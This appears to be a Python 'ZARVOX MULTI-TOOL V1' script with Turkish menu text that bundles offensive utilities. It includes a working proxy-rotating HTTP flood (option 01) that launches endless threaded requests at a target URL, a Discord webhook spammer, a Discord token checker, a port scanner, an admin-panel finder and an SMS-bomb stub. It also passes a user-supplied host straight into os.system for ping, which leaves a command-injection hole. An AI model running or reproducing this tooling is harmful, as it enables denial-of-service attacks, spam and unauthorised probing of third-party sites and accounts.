import os, sys, threading, time, random, socket, string

# --- Kütüphane Kontrolü ---
try:
    import requests
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    os.system("pip install requests colorama")
    import requests
    from colorama import Fore, Style, init
    init(autoreset=True)

# --- Ana Döngü ---
while True:
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.RED + Style.BRIGHT + r"""
  ______  ___  ______  _   _  _____ __   __
 |___  / / _ \ | ___ \| | | ||  _  |\ \ / /
    / / / /_\ \| |_/ /| | | || | | | \ V / 
   / /  |  _  ||    / | | | || | | | / ^ \ 
 ./ /___| | | || |\ \ \ \_/ /\ \_/ // / \ \
 \_____/\_| |_/\_| \_| \___/  \___/ \_/ \_/
    """)
    print(Fore.CYAN + "         --- ZARVOX MULTI-TOOL V1 ---")
    print(Fore.WHITE + "----------------------------------------------------------------------")
    print(Fore.YELLOW + " [01] Proxy DDoS          [06] Webhook Spammer    [11] Şifre Oluşturucu")
    print(Fore.YELLOW + " [02] IP Tracker          [07] DNS Lookup         [12] Site Hız Testi")
    print(Fore.YELLOW + " [03] Port Tarayıcı       [08] Kimlik Oluşturucu  [13] Cloudflare Bulucu")
    print(Fore.YELLOW + " [04] Admin Panel Bulucu  [09] Discord Token Sorgu[14] User-Agent Üretici")
    print(Fore.YELLOW + " [05] Ters IP Sorgu       [10] SMS Bomb (Sim)     [15] Ping Testi")
    print(Fore.RED + " ----------------------------------------------------------------------")
    print(Fore.WHITE + " [00] ÇIKIŞ")

    secim = input(Fore.WHITE + "\n ZARVOX V1 > ")

    if secim == "01":
        target = input(" Hedef URL: ")
        thr = int(input(" Thread: "))
        proxies = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http").text.splitlines()
        print(Fore.RED + " [!] Saldırı Başlatıldı...")
        for _ in range(thr):
            threading.Thread(target=lambda: [requests.get(target, timeout=5, proxies={"http": f"http://{random.choice(proxies)}"}) for _ in iter(int, 1)], daemon=True).start()
        while True: time.sleep(1)

    elif secim == "02":
        ip = input(" IP: ")
        r = requests.get(f"http://ip-api.com/json/{ip}").json()
        print(Fore.GREEN + f" Ülke: {r.get('country')}\n Şehir: {r.get('city')}\n ISP: {r.get('isp')}")
        input("\n Devam etmek için Enter...")

    elif secim == "03":
        ip = input(" Hedef IP: ")
        for p in [80, 443, 21, 22, 3306]:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(0.5)
            if s.connect_ex((ip, p)) == 0: print(Fore.GREEN + f" [+] Port {p} AÇIK")
            s.close()
        input("\n Tarama Bitti. Enter...")

    elif secim == "04":
        site = input(" URL (http://...): ")
        for p in ["/admin", "/login", "/panel", "/wp-admin"]:
            try:
                if requests.get(site+p, timeout=2).status_code == 200: print(Fore.GREEN + f" [+] Bulundu: {site+p}")
            except: pass
        input("\n İşlem Tamam. Enter...")

    elif secim == "05":
        ip = input(" IP: ")
        r = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}").text
        print(Fore.GREEN + r)
        input("\n Enter...")

    elif secim == "06":
        u = input(" Webhook URL: "); m = input(" Mesaj: ")
        for i in range(10): requests.post(u, json={"content": m}); print(f" [+] {i+1} Gönderildi")
        input("\n Bitti. Enter...")

    elif secim == "07":
        d = input(" Domain: ")
        try: print(Fore.GREEN + f" IP: {socket.gethostbyname(d)}")
        except: print(" Çözülemedi.")
        input("\n Enter...")

    elif secim == "08":
        ch = string.ascii_letters + string.digits
        print(Fore.GREEN + f" Nick: {''.join(random.choices(ch, k=10))}\n Pass: {''.join(random.choices(ch, k=14))}")
        input("\n Enter...")

    elif secim == "09":
        tk = input(" Token: ")
        r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': tk})
        if r.status_code == 200: print(Fore.GREEN + f" [+] Kullanıcı: {r.json()['username']}")
        else: print(Fore.RED + " [X] Geçersiz!")
        input("\n Enter...")

    elif secim == "10":
        print(Fore.YELLOW + " SMS Bomb API bağlantısı bekleniyor (Simülasyon)...")
        time.sleep(2)
        input("\n Enter...")

    elif secim == "11":
        ch = string.ascii_letters + string.digits + "!@#$"
        print(Fore.GREEN + " Yeni Şifre: " + "".join(random.choices(ch, k=16)))
        input("\n Enter...")

    elif secim == "12":
        u = input(" URL: "); st = time.time(); requests.get(u, timeout=10); et = time.time()
        print(Fore.GREEN + f" Süre: {round(et-st, 3)} sn")
        input("\n Enter...")

    elif secim == "13":
        d = input(" Domain: "); r = requests.get(f"https://api.hackertarget.com/httpheaders/?q={d}").text
        if "cloudflare" in r.lower(): print(Fore.RED + " [!] Cloudflare Bulundu!")
        else: print(Fore.GREEN + " [+] Cloudflare Yok.")
        input("\n Enter...")

    elif secim == "14":
        print(Fore.GREEN + " UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0")
        input("\n Enter...")

    elif secim == "15":
        host = input(" Host: "); os.system(f"ping {host}")
        input("\n Enter...")

    elif secim == "00":
        print(" Çıkış yapılıyor...")
        sys.exit()